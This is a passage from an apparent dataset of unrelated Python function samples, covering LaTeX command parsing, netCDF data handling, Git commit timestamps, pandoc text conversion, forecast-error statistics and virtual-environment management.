            "def update_desc_rcin_path(desc,sibs_len,pdesc_level):\n    '''\n        rightCousin\n        nextCousin\n        rightCin\n        nextCin\n        rcin\n        ncin\n        \n        parents are neighbors,and on the right\n    '''\n    psibs_len = pdesc_level.__len__()\n    parent_breadth = desc['parent_breadth_path'][-1]\n    if(desc['sib_seq']==(sibs_len - 1)):\n        if(parent_breadth==(psibs_len -1)):\n            pass\n        else:\n            parent_rsib_breadth = parent_breadth + 1\n            prsib_desc = pdesc_level[parent_rsib_breadth]\n            #because from left to right to handle each level\n            #sons_count will only be updated in the next-round \n            if(prsib_desc['leaf']):\n                pass\n            else:\n                rcin_path = copy.deepcopy(prsib_desc['path'])\n                rcin_path.append(0)\n                desc['rcin_path'] = rcin_path\n    else:\n        pass\n    return(desc)"
        ],
        [
            "def child_begin_handler(self,scache,*args):\n        '''\n            _creat_child_desc\n            update depth,parent_breadth_path,parent_path,sib_seq,path,lsib_path,rsib_path,lcin_path,rcin_path\n        '''\n        pdesc = self.pdesc\n        depth = scache.depth\n        sib_seq = self.sib_seq\n        sibs_len = self.sibs_len\n        pdesc_level = scache.pdesc_level\n        desc = copy.deepcopy(pdesc)\n        desc = reset_parent_desc_template(desc)\n        desc['depth'] = depth\n        desc['parent_breadth_path'] = copy.deepcopy(desc['breadth_path'])\n        desc['sib_seq'] = sib_seq\n        desc['parent_path'] = copy.deepcopy(desc['path'])\n        desc['path'].append(sib_seq)\n        update_desc_lsib_path(desc)\n        update_desc_rsib_path(desc,sibs_len)\n        if(depth == 1):\n            pass\n        else:\n            update_desc_lcin_path(desc,pdesc_level)\n            update_desc_rcin_path(desc,sibs_len,pdesc_level)\n        return(desc)"
        ],
        [
            "def child_end_handler(self,scache):\n        '''\n            _upgrade_breadth_info\n            update breadth, breadth_path, and add desc to desc_level\n        '''\n        desc = self.desc\n        desc_level = scache.desc_level\n        breadth = desc_level.__len__()\n        desc['breadth'] = breadth\n        desc['breadth_path'].append(breadth)\n        desc_level.append(desc)"
        ],
        [
            "def parse(self, source):\n        \"\"\"Parse command content from the LaTeX source.\n\n        Parameters\n        ----------\n        source : `str`\n            The full source of the tex document.\n\n        Yields\n        ------\n        parsed_command : `ParsedCommand`\n            Yields parsed commands instances for each occurence of the command\n            in the source.\n        \"\"\"\n        command_regex = self._make_command_regex(self.name)\n        for match in re.finditer(command_regex, source):\n            self._logger.debug(match)\n            start_index = match.start(0)\n            yield self._parse_command(source, start_index)"
        ],
        [
            "def _parse_command(self, source, start_index):\n        \"\"\"Parse a single command.\n\n        Parameters\n        ----------\n        source : `str`\n            The full source of the tex document.\n        start_index : `int`\n            Character index in ``source`` where the command begins.\n\n        Returns\n        -------\n        parsed_command : `ParsedCommand`\n            The parsed command from the source at the given index.\n        \"\"\"\n        parsed_elements = []\n\n        # Index of the parser in the source\n        running_index = start_index\n\n        for element in self.elements:\n            opening_bracket = element['bracket']\n            closing_bracket = self._brackets[opening_bracket]\n\n            # Find the opening bracket.\n            element_start = None\n            element_end = None\n            for i, c in enumerate(source[running_index:], start=running_index):\n                if c == element['bracket']:\n                    element_start = i\n                    break\n                elif c == '\\n':\n                    # No starting bracket on the line.\n                    if element['required'] is True:\n                        # Try to parse a single single-word token after the\n                        # command, like '\\input file'\n                        content = self._parse_whitespace_argument(\n                            source[running_index:],\n                            self.name)\n                        return ParsedCommand(\n                            self.name,\n                            [{'index': element['index'],\n                              'name': element['name'],\n                              'content': content.strip()}],\n                            start_index,\n                            source[start_index:i])\n                    else:\n                        # Give up on finding an optional element\n                        break\n\n            # Handle cases when the opening bracket is never found.\n            if element_start is None and element['required'] is False:\n                # Optional element not found. Continue to next element,\n                # not advancing the running_index of the parser.\n                continue\n            elif element_start is None and element['required'] is True:\n                message = ('Parsing command {0} at index {1:d}, '\n                           'did not detect element {2:d}'.format(\n                               self.name,\n                               start_index,\n                               element['index']))\n                raise CommandParserError(message)\n\n            # Find the closing bracket, keeping track of the number of times\n            # the same type of bracket was opened and closed.\n            balance = 1\n            for i, c in enumerate(source[element_start + 1:],\n                                  start=element_start + 1):\n                if c == opening_bracket:\n                    balance += 1\n                elif c == closing_bracket:\n                    balance -= 1\n\n                if balance == 0:\n                    element_end = i\n                    break\n\n            if balance > 0:\n                message = ('Parsing command {0} at index {1:d}, '\n                           'did not find closing bracket for required '\n                           'command element {2:d}'.format(\n                               self.name,\n                               start_index,\n                               element['index']))\n                raise CommandParserError(message)\n\n            # Package the parsed element's content.\n            element_content = source[element_start + 1:element_end]\n            parsed_element = {\n                'index': element['index'],\n                'name': element['name'],\n                'content': element_content.strip()\n            }\n            parsed_elements.append(parsed_element)\n\n            running_index = element_end + 1\n\n        command_source = source[start_index:running_index]\n        parsed_command = ParsedCommand(self.name, parsed_elements,\n                                       start_index, command_source)\n        return parsed_command"
        ],
        [
            "def _parse_whitespace_argument(source, name):\n        r\"\"\"Attempt to parse a single token on the first line of this source.\n\n        This method is used for parsing whitespace-delimited arguments, like\n        ``\\input file``. The source should ideally contain `` file`` along\n        with a newline character.\n\n        >>> source = 'Line 1\\n' r'\\input test.tex' '\\nLine 2'\n        >>> LatexCommand._parse_whitespace_argument(source, 'input')\n        'test.tex'\n\n        Bracket delimited arguments (``\\input{test.tex}``) are handled in\n        the normal logic of `_parse_command`.\n        \"\"\"\n        # First match the command name itself so that we find the argument\n        # *after* the command\n        command_pattern = r'\\\\(' + name + r')(?:[\\s{[%])'\n        command_match = re.search(command_pattern, source)\n        if command_match is not None:\n            # Trim `source` so we only look after the command\n            source = source[command_match.end(1):]\n\n        # Find the whitespace-delimited argument itself.\n        pattern = r'(?P<content>\\S+)(?:[ %\\t\\n]+)'\n        match = re.search(pattern, source)\n        if match is None:\n            message = (\n                'When parsing {}, did not find whitespace-delimited command '\n                'argument'\n            )\n            raise CommandParserError(message.format(name))\n        content = match.group('content')\n        content.strip()\n        return content"
        ],
        [
            "def list_from_document(cls, doc):\n        \"\"\"Returns a list of TMDDEventConverter elements.\n\n        doc is an XML Element containing one or more <FEU> events\n        \"\"\"\n        objs = []\n        for feu in doc.xpath('//FEU'):\n            detail_els = feu.xpath('event-element-details/event-element-detail')\n            for idx, detail in enumerate(detail_els):\n                objs.append(cls(feu, detail, id_suffix=idx, number_in_group=len(detail_els)))\n        return objs"
        ],
        [
            "def clone(src, dst_path, skip_globals, skip_dimensions, skip_variables):\n    \"\"\"\n        Mostly ripped from nc3tonc4 in netCDF4-python.\n        Added ability to skip dimension and variables.\n        Removed all of the unpacking logic for shorts.\n    \"\"\"\n\n    if os.path.exists(dst_path):\n        os.unlink(dst_path)\n    dst = netCDF4.Dataset(dst_path, 'w')\n\n    # Global attributes\n    for attname in src.ncattrs():\n        if attname not in skip_globals:\n            setattr(dst, attname, getattr(src, attname))\n\n    # Dimensions\n    unlimdim     = None\n    unlimdimname = False\n    for dimname, dim in src.dimensions.items():\n\n        # Skip what we need to\n        if dimname in skip_dimensions:\n            continue\n\n        if dim.isunlimited():\n            unlimdim     = dim\n            unlimdimname = dimname\n            dst.createDimension(dimname, None)\n        else:\n            dst.createDimension(dimname, len(dim))\n\n    # Variables\n    for varname, ncvar in src.variables.items():\n\n        # Skip what we need to\n        if varname in skip_variables:\n            continue\n\n        hasunlimdim = False\n        if unlimdimname and unlimdimname in ncvar.dimensions:\n            hasunlimdim = True\n\n        filler = None\n        if hasattr(ncvar, '_FillValue'):\n            filler = ncvar._FillValue\n\n        if ncvar.chunking == \"contiguous\":\n            var = dst.createVariable(varname, ncvar.dtype, ncvar.dimensions, fill_value=filler)\n        else:\n            var = dst.createVariable(varname, ncvar.dtype, ncvar.dimensions, fill_value=filler, chunksizes=ncvar.chunking())\n\n        # Attributes\n        for attname in ncvar.ncattrs():\n            if attname == '_FillValue':\n                continue\n            else:\n                setattr(var, attname, getattr(ncvar, attname))\n\n        # Data\n        nchunk = 1000\n        if hasunlimdim:\n            if nchunk:\n                start = 0\n                stop = len(unlimdim)\n                step = nchunk\n                if step < 1:\n                    step = 1\n                for n in range(start, stop, step):\n                    nmax = n + nchunk\n                    if nmax > len(unlimdim):\n                        nmax = len(unlimdim)\n                    idata = ncvar[n:nmax]\n                    var[n:nmax] = idata\n            else:\n                idata = ncvar[:]\n                var[0:len(unlimdim)] = idata\n        else:\n            idata = ncvar[:]\n            var[:] = idata\n\n        dst.sync()\n\n    src.close()\n    dst.close()"
        ],
        [
            "def get_dataframe_from_variable(nc, data_var):\n    \"\"\" Returns a Pandas DataFrame of the data.\n        This always returns positive down depths\n    \"\"\"\n    time_var = nc.get_variables_by_attributes(standard_name='time')[0]\n\n    depth_vars = nc.get_variables_by_attributes(axis=lambda v: v is not None and v.lower() == 'z')\n    depth_vars += nc.get_variables_by_attributes(standard_name=lambda v: v in ['height', 'depth' 'surface_altitude'], positive=lambda x: x is not None)\n\n    # Find the correct depth variable\n    depth_var = None\n    for d in depth_vars:\n        try:\n            if d._name in data_var.coordinates.split(\" \") or d._name in data_var.dimensions:\n                depth_var = d\n                break\n        except AttributeError:\n            continue\n\n    times  = netCDF4.num2date(time_var[:], units=time_var.units, calendar=getattr(time_var, 'calendar', 'standard'))\n    original_times_size = times.size\n\n    if depth_var is None and hasattr(data_var, 'sensor_depth'):\n        depth_type = get_type(data_var.sensor_depth)\n        depths = np.asarray([data_var.sensor_depth] * len(times)).flatten()\n        values = data_var[:].flatten()\n    elif depth_var is None:\n        depths = np.asarray([np.nan] * len(times)).flatten()\n        depth_type = get_type(depths)\n        values = data_var[:].flatten()\n    else:\n        depths = depth_var[:]\n        depth_type = get_type(depths)\n        if len(data_var.shape) > 1:\n            times = np.repeat(times, depths.size)\n            depths = np.tile(depths, original_times_size)\n            values = data_var[:, :].flatten()\n        else:\n            values = data_var[:].flatten()\n\n        if getattr(depth_var, 'positive', 'down').lower() == 'up':\n            logger.warning(\"Converting depths to positive down before returning the DataFrame\")\n            depths = depths * -1\n\n    # https://github.com/numpy/numpy/issues/4595\n    # We can't call astype on a MaskedConstant\n    if (\n        isinstance(depths, np.ma.core.MaskedConstant) or\n        (hasattr(depths, 'mask') and depths.mask.all())\n    ):\n        depths = np.asarray([np.nan] * len(times)).flatten()\n\n    df = pd.DataFrame({ 'time':   times,\n                        'value':  values.astype(data_var.dtype),\n                        'unit':   data_var.units if hasattr(data_var, 'units') else np.nan,\n                        'depth':  depths.astype(depth_type) })\n\n    df.set_index([pd.DatetimeIndex(df['time']), pd.Float64Index(df['depth'])], inplace=True)\n    return df"
        ],
        [
            "def load(cls, query_name):\n        \"\"\"Load a pre-made query.\n\n        These queries are distributed with lsstprojectmeta. See\n        :file:`lsstrojectmeta/data/githubv4/README.rst` inside the\n        package repository for details on available queries.\n\n        Parameters\n        ----------\n        query_name : `str`\n            Name of the query, such as ``'technote_repo'``.\n\n        Returns\n        -------\n        github_query : `GitHubQuery\n            A GitHub query or mutation object that you can pass to\n            `github_request` to execute the request itself.\n        \"\"\"\n        template_path = os.path.join(\n            os.path.dirname(__file__),\n            '../data/githubv4',\n            query_name + '.graphql')\n\n        with open(template_path) as f:\n            query_data = f.read()\n\n        return cls(query_data, name=query_name)"
        ],
        [
            "def read_git_commit_timestamp_for_file(filepath, repo_path=None, repo=None):\n    \"\"\"Obtain the timestamp for the most recent commit to a given file in a\n    Git repository.\n\n    Parameters\n    ----------\n    filepath : `str`\n        Absolute or repository-relative path for a file.\n    repo_path : `str`, optional\n        Path to the Git repository. Leave as `None` to use the current working\n        directory or if a ``repo`` argument is provided.\n    repo : `git.Repo`, optional\n        A `git.Repo` instance.\n\n    Returns\n    -------\n    commit_timestamp : `datetime.datetime`\n        The datetime of the most recent commit to the given file.\n\n    Raises\n    ------\n    IOError\n        Raised if the ``filepath`` does not exist in the Git repository.\n    \"\"\"\n    logger = logging.getLogger(__name__)\n\n    if repo is None:\n        repo = git.repo.base.Repo(path=repo_path,\n                                  search_parent_directories=True)\n    repo_path = repo.working_tree_dir\n\n    head_commit = repo.head.commit\n\n    # filepath relative to the repo path\n    logger.debug('Using Git repo at %r', repo_path)\n    filepath = os.path.relpath(\n        os.path.abspath(filepath),\n        start=repo_path)\n    logger.debug('Repo-relative filepath is %r', filepath)\n\n    # Most recent commit datetime of the given file.\n    # Don't use head_commit.iter_parents because then it skips the\n    # commit of a file that's added but never modified.\n    for commit in head_commit.iter_items(repo,\n                                         head_commit,\n                                         [filepath],\n                                         skip=0):\n        return commit.committed_datetime\n\n    # Only get here if git could not find the file path in the history\n    raise IOError('File {} not found'.format(filepath))"
        ],
        [
            "def get_content_commit_date(extensions, acceptance_callback=None,\n                            root_dir='.'):\n    \"\"\"Get the datetime for the most recent commit to a project that\n    affected certain types of content.\n\n    Parameters\n    ----------\n    extensions : sequence of 'str'\n        Extensions of files to consider in getting the most recent commit\n        date. For example, ``('rst', 'svg', 'png')`` are content extensions\n        for a Sphinx project. **Extension comparision is case sensitive.** add\n        uppercase variants to match uppercase extensions.\n    acceptance_callback : callable\n        Callable function whose sole argument is a file path, and returns\n        `True` or `False` depending on whether the file's commit date should\n        be considered or not. This callback is only run on files that are\n        included by ``extensions``. Thus this callback is a way to exclude\n        specific files that would otherwise be included by their extension.\n    root_dir : 'str`, optional\n        Only content contained within this root directory is considered.\n        This directory must be, or be contained by, a Git repository. This is\n        the current working directory by default.\n\n    Returns\n    -------\n    commit_date : `datetime.datetime`\n        Datetime of the most recent content commit.\n\n    Raises\n    ------\n    RuntimeError\n        Raised if no content files are found.\n    \"\"\"\n    logger = logging.getLogger(__name__)\n\n    def _null_callback(_):\n        return True\n\n    if acceptance_callback is None:\n        acceptance_callback = _null_callback\n\n    # Cache the repo object for each query\n    root_dir = os.path.abspath(root_dir)\n    repo = git.repo.base.Repo(path=root_dir, search_parent_directories=True)\n\n    # Iterate over all files with all file extensions, looking for the\n    # newest commit datetime.\n    newest_datetime = None\n    iters = [_iter_filepaths_with_extension(ext, root_dir=root_dir)\n             for ext in extensions]\n    for content_path in itertools.chain(*iters):\n        content_path = os.path.abspath(os.path.join(root_dir, content_path))\n\n        if acceptance_callback(content_path):\n            logger.debug('Found content path %r', content_path)\n            try:\n                commit_datetime = read_git_commit_timestamp_for_file(\n                    content_path, repo=repo)\n                logger.debug('Commit timestamp of %r is %s',\n                             content_path, commit_datetime)\n            except IOError:\n                logger.warning(\n                    'Count not get commit for %r, skipping',\n                    content_path)\n                continue\n\n            if not newest_datetime or commit_datetime > newest_datetime:\n                # Seed initial newest_datetime\n                # or set a newer newest_datetime\n                newest_datetime = commit_datetime\n                logger.debug('Newest commit timestamp is %s', newest_datetime)\n\n        logger.debug('Final commit timestamp is %s', newest_datetime)\n\n    if newest_datetime is None:\n        raise RuntimeError('No content files found in {}'.format(root_dir))\n\n    return newest_datetime"
        ],
        [
            "def _iter_filepaths_with_extension(extname, root_dir='.'):\n    \"\"\"Iterative over relative filepaths of files in a directory, and\n    sub-directories, with the given extension.\n\n    Parameters\n    ----------\n    extname : `str`\n        Extension name (such as 'txt' or 'rst'). Extension comparison is\n        case sensitive.\n    root_dir : 'str`, optional\n        Root directory. Current working directory by default.\n\n    Yields\n    ------\n    filepath : `str`\n        File path, relative to ``root_dir``, with the given extension.\n    \"\"\"\n    # needed for comparison with os.path.splitext\n    if not extname.startswith('.'):\n        extname = '.' + extname\n\n    root_dir = os.path.abspath(root_dir)\n\n    for dirname, sub_dirnames, filenames in os.walk(root_dir):\n        for filename in filenames:\n            if os.path.splitext(filename)[-1] == extname:\n                full_filename = os.path.join(dirname, filename)\n                rel_filepath = os.path.relpath(full_filename, start=root_dir)\n                yield rel_filepath"
        ],
        [
            "def get_variables_by_attributes(self, **kwargs):\n        \"\"\" Returns variables that match specific conditions.\n\n        * Can pass in key=value parameters and variables are returned that\n        contain all of the matches.  For example,\n\n        >>> # Get variables with x-axis attribute.\n        >>> vs = nc.get_variables_by_attributes(axis='X')\n        >>> # Get variables with matching \"standard_name\" attribute.\n        >>> nc.get_variables_by_attributes(standard_name='northward_sea_water_velocity')\n\n        * Can pass in key=callable parameter and variables are returned if the\n        callable returns True.  The callable should accept a single parameter,\n        the attribute value.  None is given as the attribute value when the\n        attribute does not exist on the variable. For example,\n\n        >>> # Get Axis variables.\n        >>> vs = nc.get_variables_by_attributes(axis=lambda v: v in ['X', 'Y', 'Z', 'T'])\n        >>> # Get variables that don't have an \"axis\" attribute.\n        >>> vs = nc.get_variables_by_attributes(axis=lambda v: v is None)\n        >>> # Get variables that have a \"grid_mapping\" attribute.\n        >>> vs = nc.get_variables_by_attributes(grid_mapping=lambda v: v is not None)\n\n        \"\"\"\n        vs = []\n\n        has_value_flag  = False\n        for vname in self.variables:\n            var = self.variables[vname]\n            for k, v in kwargs.items():\n                if callable(v):\n                    has_value_flag = v(getattr(var, k, None))\n                    if has_value_flag is False:\n                        break\n                elif hasattr(var, k) and getattr(var, k) == v:\n                    has_value_flag = True\n                else:\n                    has_value_flag = False\n                    break\n\n            if has_value_flag is True:\n                vs.append(self.variables[vname])\n\n        return vs"
        ],
        [
            "def json_attributes(self, vfuncs=None):\n        \"\"\"\n        vfuncs can be any callable that accepts a single argument, the\n        Variable object, and returns a dictionary of new attributes to\n        set. These will overwrite existing attributes\n        \"\"\"\n\n        vfuncs = vfuncs or []\n\n        js = {'global': {}}\n\n        for k in self.ncattrs():\n            js['global'][k] = self.getncattr(k)\n\n        for varname, var in self.variables.items():\n            js[varname] = {}\n            for k in var.ncattrs():\n                z = var.getncattr(k)\n                try:\n                    assert not np.isnan(z).all()\n                    js[varname][k] = z\n                except AssertionError:\n                    js[varname][k] = None\n                except TypeError:\n                    js[varname][k] = z\n\n            for vf in vfuncs:\n                try:\n                    js[varname].update(vfuncs(var))\n                except BaseException:\n                    logger.exception(\"Could not apply custom variable attribue function\")\n\n        return json.loads(json.dumps(js, cls=BasicNumpyEncoder))"
        ],
        [
            "def ensure_pandoc(func):\n    \"\"\"Decorate a function that uses pypandoc to ensure that pandoc is\n    installed if necessary.\n    \"\"\"\n    logger = logging.getLogger(__name__)\n\n    @functools.wraps(func)\n    def _install_and_run(*args, **kwargs):\n        try:\n            # First try to run pypandoc function\n            result = func(*args, **kwargs)\n        except OSError:\n            # Install pandoc and retry\n            message = \"pandoc needed but not found. Now installing it for you.\"\n            logger.warning(message)\n            # This version of pandoc is known to be compatible with both\n            # pypandoc.download_pandoc and the functionality that\n            # lsstprojectmeta needs. Travis CI tests are useful for ensuring\n            # download_pandoc works.\n            pypandoc.download_pandoc(version='1.19.1')\n            logger.debug(\"pandoc download complete\")\n\n            result = func(*args, **kwargs)\n\n        return result\n\n    return _install_and_run"
        ],
        [
            "def convert_text(content, from_fmt, to_fmt, deparagraph=False, mathjax=False,\n                 smart=True, extra_args=None):\n    \"\"\"Convert text from one markup format to another using pandoc.\n\n    This function is a thin wrapper around `pypandoc.convert_text`.\n\n    Parameters\n    ----------\n    content : `str`\n        Original content.\n\n    from_fmt : `str`\n        Format of the original ``content``. Format identifier must be one of\n        those known by Pandoc. See https://pandoc.org/MANUAL.html for details.\n\n    to_fmt : `str`\n        Output format for the content.\n\n    deparagraph : `bool`, optional\n        If `True`, then the\n        `lsstprojectmeta.pandoc.filters.deparagraph.deparagraph` filter is\n        used to remove paragraph (``<p>``, for example) tags around a single\n        paragraph of content. That filter does not affect content that\n        consists of multiple blocks (several paragraphs, or lists, for\n        example). Default is `False`.\n\n        For example, **without** this filter Pandoc will convert\n        the string ``\"Title text\"`` to ``\"<p>Title text</p>\"`` in HTML. The\n        paragraph tags aren't useful if you intend to wrap the converted\n        content in different tags, like ``<h1>``, using your own templating\n        system.\n\n        **With** this filter, Pandoc will convert the string ``\"Title text\"``\n        to ``\"Title text\"`` in HTML.\n\n    mathjax : `bool`, optional\n        If `True` then Pandoc will markup output content to work with MathJax.\n        Default is False.\n\n    smart : `bool`, optional\n        If `True` (default) then ascii characters will be converted to unicode\n        characters like smart quotes and em dashes.\n\n    extra_args : `list`, optional\n        Sequence of Pandoc arguments command line arguments (such as\n        ``'--normalize'``). The ``deparagraph``, ``mathjax``, and ``smart``\n        arguments are convenience arguments that are equivalent to items\n        in ``extra_args``.\n\n    Returns\n    -------\n    output : `str`\n        Content in the output (``to_fmt``) format.\n\n    Notes\n    -----\n    This function will automatically install Pandoc if it is not available.\n    See `ensure_pandoc`.\n    \"\"\"\n    logger = logging.getLogger(__name__)\n\n    if extra_args is not None:\n        extra_args = list(extra_args)\n    else:\n        extra_args = []\n\n    if mathjax:\n        extra_args.append('--mathjax')\n\n    if smart:\n        extra_args.append('--smart')\n\n    if deparagraph:\n        extra_args.append('--filter=lsstprojectmeta-deparagraph')\n\n    extra_args.append('--wrap=none')\n\n    # de-dupe extra args\n    extra_args = set(extra_args)\n\n    logger.debug('Running pandoc from %s to %s with extra_args %s',\n                 from_fmt, to_fmt, extra_args)\n\n    output = pypandoc.convert_text(content, to_fmt, format=from_fmt,\n                                   extra_args=extra_args)\n    return output"
        ],
        [
            "def convert_lsstdoc_tex(\n        content, to_fmt, deparagraph=False, mathjax=False,\n        smart=True, extra_args=None):\n    \"\"\"Convert lsstdoc-class LaTeX to another markup format.\n\n    This function is a thin wrapper around `convert_text` that automatically\n    includes common lsstdoc LaTeX macros.\n\n    Parameters\n    ----------\n    content : `str`\n        Original content.\n\n    to_fmt : `str`\n        Output format for the content (see https://pandoc.org/MANUAL.html).\n        For example, 'html5'.\n\n    deparagraph : `bool`, optional\n        If `True`, then the\n        `lsstprojectmeta.pandoc.filters.deparagraph.deparagraph` filter is\n        used to remove paragraph (``<p>``, for example) tags around a single\n        paragraph of content. That filter does not affect content that\n        consists of multiple blocks (several paragraphs, or lists, for\n        example). Default is `False`.\n\n        For example, **without** this filter Pandoc will convert\n        the string ``\"Title text\"`` to ``\"<p>Title text</p>\"`` in HTML. The\n        paragraph tags aren't useful if you intend to wrap the converted\n        content in different tags, like ``<h1>``, using your own templating\n        system.\n\n        **With** this filter, Pandoc will convert the string ``\"Title text\"``\n        to ``\"Title text\"`` in HTML.\n\n    mathjax : `bool`, optional\n        If `True` then Pandoc will markup output content to work with MathJax.\n        Default is False.\n\n    smart : `bool`, optional\n        If `True` (default) then ascii characters will be converted to unicode\n        characters like smart quotes and em dashes.\n\n    extra_args : `list`, optional\n        Sequence of Pandoc arguments command line arguments (such as\n        ``'--normalize'``). The ``deparagraph``, ``mathjax``, and ``smart``\n        arguments are convenience arguments that are equivalent to items\n        in ``extra_args``.\n\n    Returns\n    -------\n    output : `str`\n        Content in the output (``to_fmt``) format.\n\n    Notes\n    -----\n    This function will automatically install Pandoc if it is not available.\n    See `ensure_pandoc`.\n    \"\"\"\n    augmented_content = '\\n'.join((LSSTDOC_MACROS, content))\n    return convert_text(\n        augmented_content, 'latex', to_fmt,\n        deparagraph=deparagraph, mathjax=mathjax,\n        smart=smart, extra_args=extra_args)"
        ],
        [
            "def decode_jsonld(jsonld_text):\n    \"\"\"Decode a JSON-LD dataset, including decoding datetime\n    strings into `datetime.datetime` objects.\n\n    Parameters\n    ----------\n    encoded_dataset : `str`\n        The JSON-LD dataset encoded as a string.\n\n    Returns\n    -------\n    jsonld_dataset : `dict`\n        A JSON-LD dataset.\n\n    Examples\n    --------\n\n    >>> doc = '{\"dt\": \"2018-01-01T12:00:00Z\"}'\n    >>> decode_jsonld(doc)\n    {'dt': datetime.datetime(2018, 1, 1, 12, 0, tzinfo=datetime.timezone.utc)}\n    \"\"\"\n    decoder = json.JSONDecoder(object_pairs_hook=_decode_object_pairs)\n    return decoder.decode(jsonld_text)"
        ],
        [
            "def default(self, obj):\n        \"\"\"Encode values as JSON strings.\n\n        This method overrides the default implementation from\n        `json.JSONEncoder`.\n        \"\"\"\n        if isinstance(obj, datetime.datetime):\n            return self._encode_datetime(obj)\n\n        # Fallback to the default encoding\n        return json.JSONEncoder.default(self, obj)"
        ],
        [
            "def find_repos(self, depth=10):\n        '''Get all git repositories within this environment'''\n\n        repos = []\n\n        for root, subdirs, files in walk_dn(self.root, depth=depth):\n            if 'modules' in root:\n                continue\n            if '.git' in subdirs:\n                repos.append(root)\n\n        return repos"
        ],
        [
            "def install(self, package):\n        '''Install a python package using pip'''\n\n        logger.debug('Installing ' + package)\n        shell.run(self.pip_path, 'install',  package)"
        ],
        [
            "def upgrade(self, package):\n        '''Update a python package using pip'''\n\n        logger.debug('Upgrading ' + package)\n        shell.run(self.pip_path, 'install', '--upgrade', '--no-deps', package)\n        shell.run(self.pip_path, 'install', package)"
        ],
        [
            "def df_quantile(df, nb=100):\n    \"\"\"Returns the nb quantiles for datas in a dataframe\n    \"\"\"\n    quantiles = np.linspace(0, 1., nb)\n    res = pd.DataFrame()\n    for q in quantiles:\n        res = res.append(df.quantile(q), ignore_index=True)\n    return res"
        ],
        [
            "def rmse(a, b):\n    \"\"\"Returns the root mean square error betwwen a and b\n    \"\"\"\n    return np.sqrt(np.square(a - b).mean())"
        ],
        [
            "def nmse(a, b):\n    \"\"\"Returns the normalized mean square error of a and b\n    \"\"\"\n    return np.square(a - b).mean() / (a.mean() * b.mean())"
        ],
        [
            "def mfbe(a, b):\n    \"\"\"Returns the mean fractionalized bias error\n    \"\"\"\n    return 2 * bias(a, b) / (a.mean() + b.mean())"
        ],
        [
            "def foex(a, b):\n    \"\"\"Returns the factor of exceedance\n    \"\"\"\n    return (np.sum(a > b, dtype=float) / len(a) - 0.5) * 100"
        ],
        [
            "def correlation(a, b):\n    \"\"\"Computes the correlation between a and b, says the Pearson's correlation\n    coefficient R\n    \"\"\"\n    diff1 = a - a.mean()\n    diff2 = b - b.mean()\n    return (diff1 * diff2).mean() / (np.sqrt(np.square(diff1).mean() * np.square(diff2).mean()))"
        ],
        [
            "def gmb(a, b):\n    \"\"\"Geometric mean bias\n    \"\"\"\n    return np.exp(np.log(a).mean() - np.log(b).mean())"
        ],
        [
            "def gmv(a, b):\n    \"\"\"Geometric mean variance\n    \"\"\"\n    return np.exp(np.square(np.log(a) - np.log(b)).mean())"
        ],
        [
            "def fmt(a, b):\n    \"\"\"Figure of merit in time\n    \"\"\"\n    return 100 * np.min([a, b], axis=0).sum() / np.max([a, b], axis=0).sum()"
        ],
        [
            "def fullStats(a, b):\n    \"\"\"Performs several stats on a against b, typically a is the predictions\n    array, and b the observations array\n\n    Returns:\n        A dataFrame of stat name, stat description, result\n    \"\"\"\n\n    stats = [\n        ['bias', 'Bias', bias(a, b)],\n        ['stderr', 'Standard Deviation Error', stderr(a, b)],\n        ['mae', 'Mean Absolute Error', mae(a, b)],\n        ['rmse', 'Root Mean Square Error', rmse(a, b)],\n        ['nmse', 'Normalized Mean Square Error', nmse(a, b)],\n        ['mfbe', 'Mean Fractionalized bias Error', mfbe(a, b)],\n        ['fa2', 'Factor of Two', fa(a, b, 2)],\n        ['foex', 'Factor of Exceedance', foex(a, b)],\n        ['correlation', 'Correlation R', correlation(a, b)],\n        ['determination', 'Coefficient of Determination r2', determination(a, b)],\n        ['gmb', 'Geometric Mean Bias', gmb(a, b)],\n        ['gmv', 'Geometric Mean Variance', gmv(a, b)],\n        ['fmt', 'Figure of Merit in Time', fmt(a, b)]\n    ]\n    rec = np.rec.fromrecords(stats, names=('stat', 'description', 'result'))\n    df = pd.DataFrame.from_records(rec, index='stat')\n    return df"
        ],
        [
            "def site_path(self):\n        '''Path to environments site-packages'''\n\n        if platform == 'win':\n            return unipath(self.path, 'Lib', 'site-packages')\n\n        py_ver = 'python{0}'.format(sys.version[:3])\n        return unipath(self.path, 'lib', py_ver, 'site-packages')"
        ],
        [
            "def _pre_activate(self):\n        '''\n        Prior to activating, store everything necessary to deactivate this\n        environment.\n        '''\n\n        if 'CPENV_CLEAN_ENV' not in os.environ:\n            if platform == 'win':\n                os.environ['PROMPT'] = '$P$G'\n            else:\n                os.environ['PS1'] = '\\\\u@\\\\h:\\\\w\\\\$'\n            clean_env_path = utils.get_store_env_tmp()\n            os.environ['CPENV_CLEAN_ENV'] = clean_env_path\n            utils.store_env(path=clean_env_path)\n        else:\n            utils.restore_env_from_file(os.environ['CPENV_CLEAN_ENV'])"
        ],
        [
            "def _activate(self):\n        '''\n        Do some serious mangling to the current python environment...\n        This is necessary to activate an environment via python.\n        '''\n\n        old_syspath = set(sys.path)\n        site.addsitedir(self.site_path)\n        site.addsitedir(self.bin_path)\n        new_syspaths = set(sys.path) - old_syspath\n        for path in new_syspaths:\n            sys.path.remove(path)\n            sys.path.insert(1, path)\n\n        if not hasattr(sys, 'real_prefix'):\n            sys.real_prefix = sys.prefix\n\n        sys.prefix = self.path"
        ],
        [
            "def remove(self):\n        '''\n        Remove this environment\n        '''\n        self.run_hook('preremove')\n        utils.rmtree(self.path)\n        self.run_hook('postremove')"
        ],
        [
            "def command(self):\n        '''Command used to launch this application module'''\n\n        cmd = self.config.get('command', None)\n        if cmd is None:\n            return\n\n        cmd = cmd[platform]\n        return cmd['path'], cmd['args']"
        ],
        [
